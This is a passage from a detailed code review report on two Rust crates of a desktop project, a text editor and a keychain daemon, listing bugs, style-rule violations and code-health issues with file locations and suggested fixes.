   - **Description**: `write()` captures `generation = doc.history.generation()` without sealing the history, and `mark_saved` seals only when `Saved` arrives. Characters typed during the write (with `sync_all` on file and folder) within 1.5 s merge into the same `Change`, which keeps its id, so `saved()` sets `doc.saved = generation` equal to the current id and the document reads clean although the disk lacks the late characters. With restore off, close does not prompt; with restore on, no draft is written. Call `doc.history.seal()` in `write()` first.
2. **The info bar's "Reload" button never reloads**
   - **Location**: `crates/glide-text/src/app.rs:1013-1021, 1125-1135, 1231-1244`
   - **Description**: `changed_on_disk` is set only for dirty documents, so the Reload button only appears on a dirty doc. `Message::Disk(true)` reads the file and sends `Reloaded(id, …)` without putting `id` into `self.reverting`, and the handler drops the result because `!reverting && dirty()`. It cleared `changed_on_disk` without updating `doc.disk`, so the bar reappears a second later: the user can never take the disk version. The same handler also drops a background reload of a clean doc if the user starts typing before it arrives, and since `tick` already updated `doc.disk` the change is never flagged, so a later save overwrites the external edit without warning.
3. **Stale worker highlighting is installed as current after a language change**
   - **Location**: `crates/glide-text/src/app.rs:1035-1041, 1258-1282, 1705-1714`, `crates/glide-text/src/document.rs:456-482`
   - **Description**: `Highlighted(id, revision, lines)` carries no language. For a document over 96 KiB with a worker in flight for revision R in language A, picking Highlight Mode › B (or a `redetect` switch) at the same revision sets `highlighted = u64::MAX`, but `schedule` does nothing while `in_flight` holds the id; the returning worker installs A's spans and sets `highlighted = R`, so `stale()` is false and the document keeps A's colours until the next edit. Include a language epoch in the message.
4. **The Latin-1 fallback combined with a silent switch to UTF-8 on save corrupts files irreversibly**
   - **Location**: `crates/glide-text/src/document.rs:96-116, 135-142`, `crates/glide-text/src/app.rs:2283-2286`
   - **Description**: Any file that is not valid UTF-8 — UTF-8 with one stray byte, Windows-1251, Windows-1252 smart quotes / € (decoded to C1 controls) — is decoded entirely as ISO-8859-1. Saving it unchanged is byte-faithful, but once the user types any character outside Latin-1 (Cyrillic, "€", "—"), `write()` switches `doc.encoding` to UTF-8 and only shows a notice: every existing non-ASCII character is re-encoded from its wrong Latin-1 reading (UTF-8 double-encoded, cp1252 punctuation turned into `C2 93`-style garbage), and reopening cannot undo it because the file is now valid UTF-8 mojibake. Ask before changing the encoding and detect almost-UTF-8 input.
5. **A non-UTF-8 file argument crashes the app at startup**
   - **Location**: `crates/glide-text/src/app.rs:641-652` (also `crates/glide-sdk/src/app.rs:757`)
   - **Description**: `std::env::args()` panics on a non-Unicode argument. With `Exec=glide-text %F`, "Open With → Text" on a file with a non-UTF-8 name (or `glide-text $'caf\xe9.txt'`) aborts before a window appears. Use `args_os()` and keep `OsString` / `PathBuf`.
6. **Collapsing a folder while it is still loading leaves `loading` stuck, and two such folders re-list each other forever**
   - **Location**: `crates/glide-text/src/tree.rs:116-119, 138-152, 160-162`, `crates/glide-text/src/app.rs:1042-1049`
   - **Description**: `toggle` on an expanded node clears `expanded` but leaves `loading = true`, and `fill` returns early for a collapsed node, so it stays in `pending()`. `Message::Listed(folder)` re-requests every pending folder except `folder`; with two such folders, Listed(B) requests A, Listed(A) requests B, and so on, each round spawning a `glide-text-io` thread doing `read_dir`, until a focus-regain refresh rebuilds the nodes (nested ones are not reset even then). Clear `loading` on collapse and in `fill`'s early return.
7. **Evicting history over the 64 MiB budget can make a modified document read as clean**
   - **Location**: `crates/glide-text/src/history.rs:74-76, 117-123`, `crates/glide-text/src/document.rs:305-308`, `crates/glide-text/src/app.rs:2345-2351`
   - **Description**: `generation()` is 0 for an empty undo stack and documents start with `saved == 0`. Make one big edit on a large file (Replace All on a 40 MiB log ≈ 80 MiB of change), then another; the budget evicts the first, and undoing the second empties the stack, so `generation() == 0 == saved` and `dirty()` is false although the first edit is still applied. Close does not prompt and the edit is lost. Track evictions so an emptied stack reads clean only when nothing was evicted.

##### AGENTS.md Trap
1. **The status islands enter with 8 px of travel and opacity on the full track (§8)**
   - **Location**: `crates/glide-text/src/chrome.rs:483-487` → `crates/glide-sdk/src/widget/layout.rs:437-459`
   - **Description**: `status_islands` moves the auto-hiding bottom islands only `SP2` (8 px; `rest = SP3 - (1 - shown) * SP2`) and fades them with `paint.faded(shown)` on the same linear track. §8 asks ≥ 24 px or 8 % for panels and opacity reaching 1 within the first 40 %. Fix it in the SDK helper.

##### Code Health
1. **The rename-based save ignores read-only mode and breaks hard links and ownership**
   - **Location**: `crates/glide-text/src/document.rs:149-161`, `crates/glide-config/src/file.rs:8-37`
   - **Description**: A `0444` file in a writable folder is saved without complaint; hard links keep the old content; owner, group, ACLs and xattrs are replaced (see `glide-config` Bug 3). Check read-only and link count first and write in place or ask.
2. **Blocking file I/O runs on the UI thread**
   - **Location**: `crates/glide-text/src/app.rs:718-770, 1231-1244, 1284-1305`
   - **Description**: `restore()` reads every session tab and draft synchronously at launch, `tick()` stats every open path every second, and the Markdown preview is re-parsed in full on each revision inside `update`; a hung network mount or many large tabs freezes the window.
3. **Auto-pair steps over closers and quotes it never inserted**
   - **Location**: `crates/glide-text/src/edit.rs:298-302`
   - **Description**: Typing `)`, `]`, `}` or a quote when the same character follows the caret always moves the caret, including `'` in Plain, Markdown and Rust where `'` is never paired; in `if (a && (b|)` the `)` typed to balance the line is swallowed. Step over only closers that auto-pair inserted.
4. **Tab stops are computed from byte columns**
   - **Location**: `crates/glide-text/src/edit.rs:196-200`
   - **Description**: `column` is a byte offset, so after Cyrillic text Tab-with-spaces pads to the wrong stop (`аб` + Tab at width 4 inserts 4 spaces instead of 2). Count `chars()` or display width.
5. **Lone-CR files are converted silently**
   - **Location**: `crates/glide-text/src/document.rs:86-94`
   - **Description**: A classic-Mac file using only `\r` is reported as `Ending::Lf` with `mixed == false`, opens with no notice, and the first save rewrites every line ending. Add `Ending::Cr` or treat it as mixed.

---

### 33. `glide-keychain` (9,638 lines)

#### Summary
`glide-keychain` is the keychain daemon (library plus the `glide-keychain` binary), located at `crates/glide-keychain`. `vault.rs` is the XChaCha20-Poly1305 file with an Argon2id key, the header as AAD and atomic 0600 writes; `local.rs`, `bitwarden/` and `kdbx/` are the three providers; `daemon.rs` merges them and `service.rs` runs it behind a `std::sync::Mutex` and owns the sync thread; `login.rs` is the app-keys keyring with the PAM handoff and rekey logic; `secrets/` serves `org.freedesktop.secrets` (plain and DH sessions, salted HMAC index, prompts); `bus.rs` serves `org.glide.Keychain1` with a `/proc/<pid>/exe` peer check; `transfer.rs`, `leaks.rs` and `totp.rs` complete it.

`unsafe` appears only in `main.rs:40` and `login.rs:149-160`, each with a `// SAFETY:` comment; the other comments are three `#[allow]` justifications, so the crate complies with `AGENTS.md` § 6. `cargo clippy -p glide-keychain --all-targets -- -D warnings` is clean; 103 tests pass (96 lib, 7 integration on a private `dbus-daemon` with the real binary) and 3 live tests (`$GLIDE_VAULTWARDEN`, `$GLIDE_KDBX_DIR`) are ignored. Checked and sound: a fresh 24-byte nonce per seal with the header authenticated; EncString type 2 verified with a constant-time HMAC before CBC decryption (type 0 only for MAC-less keys, as Bitwarden clients do); the DH peer value range-checked; TOTP refuses period 0 and limits digits to 6–10; every login handoff / rekey path behaves as AGENTS.md describes. Any session client can read Secret Service items without a prompt while the keyring is unlocked — the freedesktop model, as in gnome-keyring, so not counted. Plaintext copies made by `password_text()` / `text()` and the JSON strings in `bus.rs` are not zeroized (minor). Deep review found 5 Bugs, 1 AGENTS.md trap violation and 5 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **A direct Bitwarden edit of an item that still has queued offline changes produces a false conflict, and "Keep Local" restores the older edit**
   - **Location**: `crates/glide-keychain/src/bitwarden/mod.rs:562-585, 758-801` (line 767), `crates/glide-keychain/src/bitwarden/sync.rs:124-130`
   - **Description**: `change()` and `save()` choose between a direct push and the queue only from `self.syncing || is_new(id)`, never from `account.queue` or `self.offline`. Edit A of item X is queued offline as `Save{X, base=r1}`; the failed sync keeps the queue and the next flush may wait up to `RETRY_AFTER` (120 s). If the user edits X again before that, the body (A + B) is PUT directly and the server moves to r2; the next `flush` sees base r1 ≠ r2 and records a `StoredClash` whose "local" side is the A-only body. Choosing Local PUTs it over B and B is lost; a direct trash of X causes the same false clash. Route `save` / `change` through the queue while it holds an entry for that id, or flush first.
2. **A queued Bitwarden change that the server refuses is dropped without a trace**
   - **Location**: `crates/glide-keychain/src/bitwarden/sync.rs:143-149`, `crates/glide-keychain/src/bitwarden/mod.rs:657-675`
   - **Description**: In `flush`, `Err(ApiError::Rejected(_))` for an existing item's `Save` is neither kept nor turned into a `StoredClash`. `Rejected` covers any 4xx other than 401 / 429 (a validation error, another device updating the item between `/sync` and the PUT). `apply_sync` then adopts the server copy and the offline edit disappears, leaving only a `failure` string; a refused new item is skipped together with its later trash / restore entries and vanishes too. Store a rejected `Save` as a clash and keep a refused new item as a local draft.
3. **Saving into a KeePass database replaces a symlinked `.kdbx` with a regular file**
   - **Location**: `crates/glide-keychain/src/kdbx/vault.rs:84-103, 197-200`
   - **Description**: `replace` writes `.{name}.glide-{pid}` next to `path` and renames over it without resolving symlinks. A database registered as `~/Passwords.kdbx -> ~/Nextcloud/Passwords.kdbx` loses the link on the first Glide save; Glide then edits a local copy that never syncs while KeePassXC and other devices keep using the real file, and each side silently misses the other's changes. The fixed per-pid temp name also blocks `create_new` after a crash, the folder is not fsynced, and the check-then-rename at lines 197-200 has no lock. `glide_config::write_atomic` already handles all of this.
4. **Editing a KeePass entry in a group whose name contains `/` or `\` moves it into newly created groups**
   - **Location**: `crates/glide-keychain/src/kdbx/vault.rs:113-129, 258-277`, `crates/glide-keychain/src/kdbx/mod.rs:81-94`
   - **Description**: `collect` builds the folder by joining group names with `" / "`, keeping `Clients/2024` intact, but `save` turns it back into `split(" / ").join("/")` and `group_for` splits on `'/'` and `'\\'`. Any edit of an entry in group `Clients/2024`, even a password change, creates `Clients` → `2024` under the root and moves the entry there; duplicate sibling names (first wins) and unnamed groups also move entries. Keep the current group when the folder is unchanged and resolve folders by group-id path.
5. **Secret Service sessions are never removed when their client leaves, and the cap evicts the oldest live session**
   - **Location**: `crates/glide-keychain/src/secrets/mod.rs:311-348`
   - **Description**: Sessions are dropped only by `Session.Close`, with no `NameOwnerChanged` cleanup and no link to the sender. libsecret frees its session without Close when its proxy is disposed, so every short-lived `secret-tool` or `git-credential-libsecret` run leaves one behind. At 1024 sessions `open_session` evicts the lowest serial — the oldest, i.e. exactly the session of a long-running client such as Chrome or a mail client, whose next `GetSecret` fails with `NoSession`. Record each session's sender, drop its sessions on disconnect, and evict only orphaned ones.

##### AGENTS.md Trap
1. **Secret Service handlers wait on the daemon mutex while the main thread holds it across network calls and KDFs ("Blocking the event loop", on the zbus executor)**
   - **Location**: `crates/glide-keychain/src/secrets/mod.rs:111-119, 186-194, 227-242, 381-395`, `crates/glide-keychain/src/service.rs:111`, `crates/glide-keychain/src/bitwarden/mod.rs:553, 776-777, 859-861, 884, 907-911, 924, 932`, `crates/glide-keychain/src/bus.rs:59-61`
   - **Description**: `Secrets::items()`, `unlocked()` and `edit()` call `service.daemon()`, a blocking `std::sync::Mutex::lock`, inside `#[zbus::interface]` methods that run on the single executor of the shared session connection serving both Secret Service and `org.glide.Keychain1`. `Service::handle` holds that mutex for the whole `daemon.handle(request)`, which for Bitwarden includes `save` (possibly POST `/folders`, then POST / PUT the cipher), trash, restore, purge, `resolve` and Sends — each with an 8 s connect / 30 s overall timeout, retried on every save while offline — plus master-key KDFs on unlock. A save or an import into a Bitwarden vault while the server is unreachable freezes every D-Bus client of the daemon: Chrome's start-up lookup and glide-passwords' own calls hang. (Also worth checking: `bus.rs:59-61` emits a signal through `zbus::blocking::Connection::emit_signal` from inside an async handler on the same executor.) Move daemon access in the Secret Service handlers to `blocking::unblock`, as `bus.rs` does, and keep network round trips outside the mutex as `SyncJob` does.

##### Code Health
1. **The `org.glide.Keychain1` peer check fails closed after an upgrade and is not a boundary against same-user code**
   - **Location**: `crates/glide-keychain/src/bus.rs:27-36, 81-88`
   - **Description**: After a package upgrade `/proc/<pid>/exe` of a running glide-passwords reads `/usr/bin/glide-passwords (deleted)` and every call is denied until it restarts. The check also accepts `LD_PRELOAD=… glide-passwords` or a ptraced instance, which can read every secret while unlocked. It matches the project's exe-based trust model but is a speed bump, not a boundary.
2. **A failed key-file write leaves a PAM-protected keyring with a plain key file**
   - **Location**: `crates/glide-keychain/src/login.rs:241-249`
   - **Description**: `apply` does `self.fresh.take()` before `write_atomically(&self.key_file, …)`; if the write fails (disk full), the verified wrapping key is gone and the next successful edit writes a plain key file, so the keyring ends up `Guard::File`. Take `fresh` only after the write succeeds.
3. **KDF parameters from untrusted input are unbounded**
   - **Location**: `crates/glide-keychain/src/bitwarden/crypto.rs:46-55`, `crates/glide-keychain/src/transfer.rs:233-243`
   - **Description**: `Kdf::from_prelogin` accepts PBKDF2 iterations up to `u32::MAX` and any Argon2 iteration count (memory up to 1 GiB), so an imported protected JSON or a hostile prelogin can pin a thread for hours; `kdfIterations` / `kdfType` are truncated with `as`. Cap them and reject values that do not fit.
4. **A panic in the sync thread leaves Bitwarden vaults "Syncing" forever**
   - **Location**: `crates/glide-keychain/src/service.rs:152-155`, `crates/glide-keychain/src/bitwarden/api.rs:308`, `crates/glide-keychain/src/bitwarden/dates.rs:38-39`
   - **Description**: `prepare_sync` sets `syncing = true` and only `apply_sync` clears it; `job.run` has no `catch_unwind`, and server-controlled arithmetic (`now + expires_in`, `days * 86_400` with a huge year) overflows in debug builds. A dead sync thread stops all background syncs and every later change queues forever.
5. **An offline save into a new folder silently drops the folder**
   - **Location**: `crates/glide-keychain/src/bitwarden/mod.rs:768-772`
   - **Description**: When the save is queued while offline only `known_folder` is consulted, so a folder typed offline gives `folderId: null` and the item lands without a folder after syncing.

